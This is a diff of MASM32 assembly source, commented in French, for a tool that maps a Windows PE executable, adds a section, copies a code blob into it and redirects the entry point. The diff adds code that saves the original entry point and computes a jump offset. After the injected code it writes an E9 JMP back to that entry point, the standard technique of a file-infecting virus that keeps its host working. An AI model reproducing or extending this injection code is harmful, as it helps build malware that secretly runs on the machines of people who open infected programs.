@@ -30,6 +30,7 @@ includelib C:\masm32\lib\masm32.lib
 	infoFailedL		db		"Get info failed !!", 0
 	entryPointL		db		"EntryPoint",0
 	lastSectionL	db		"Last Section",0
+	jumpL			db		"Jump",0
 	;
 	; Addresse de l'exe mappé
 	;
@@ -42,6 +43,8 @@ includelib C:\masm32\lib\masm32.lib
 	machine86		db		0
 	nbSections		dw		0
 	sizeOptHeader	dw		0
+	oldEntry		dd		0
+	offsetEntry		dd		0
 	
 	;
 	;	- Header Ptr
@@ -236,10 +239,12 @@ GetLastSection endp
 OverwriteEntryPoint proc uses esi edi New:DWORD
 	mov esi, imgOptHeader
 	lea edi, [esi].IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint
+	mov esi, [edi]
+	mov oldEntry, esi
 	mov esi, New
 	mov DWORD PTR [edi], esi
 	;invoke MessageBox, 0, uhex$(esi), ADDR entryPointL, MB_OK
-	mov DWORD ptr [edi], esi
+	;mov DWORD ptr [edi], esi
 	ret
 OverwriteEntryPoint endp
 
@@ -276,8 +281,8 @@ InjectSection proc lastSection:DWORD
 	mov edx, [esi].IMAGE_SECTION_HEADER.VirtualAddress
 	mov ebx, [esi].IMAGE_SECTION_HEADER.SizeOfRawData
 	add edx, ebx
-	;and edx, 0FFFFF000h
-	;add edx, 1000h
+	and edx, 0FFFFF000h
+	add edx, 1000h
 	mov virtualEnd, edx
 	
 	; Overwrite entry point
@@ -310,6 +315,7 @@ InjectSection proc lastSection:DWORD
 	; Set Pointer to raw data
 	lea edx, [edi].IMAGE_SECTION_HEADER.PointerToRawData
 	mov ebx, endAddr
+	
 	mov [edx], ebx
 	
 	; Set characteristics
@@ -318,11 +324,28 @@ InjectSection proc lastSection:DWORD
 	
 	;ret 
 	; Test move to section.
+	mov edx, virtualEnd
+	add edx, 113h
+	add edx, 4h
+	mov ebx, oldEntry
+	sub edx, ebx
+	mov ebx, 0FFFFFFFFh
+	sub ebx, edx
+	mov offsetEntry, ebx
+	
+	;invoke MessageBox, 0, uhex$(virtualEnd), ADDR jumpL, MB_OK
+	
 	mov edx, targetSection
 	mov ebx, mappedAddr
 	add edx, ebx
 	;mov DWORD PTR [edx], 41414141h
-	invoke MemCopy, ADDR code, edx, 120h
+	invoke MemCopy, ADDR code, edx, 113h
+	add edx, 113h
+
+	mov BYTE PTR [edx], 0E9h
+	inc edx
+	mov ebx, offsetEntry
+	mov DWORD PTR [edx], ebx
 	;invoke MemCopy, ADDR code, edx, 25h
 	;mov DWORD ptr [edx], ebx
 	
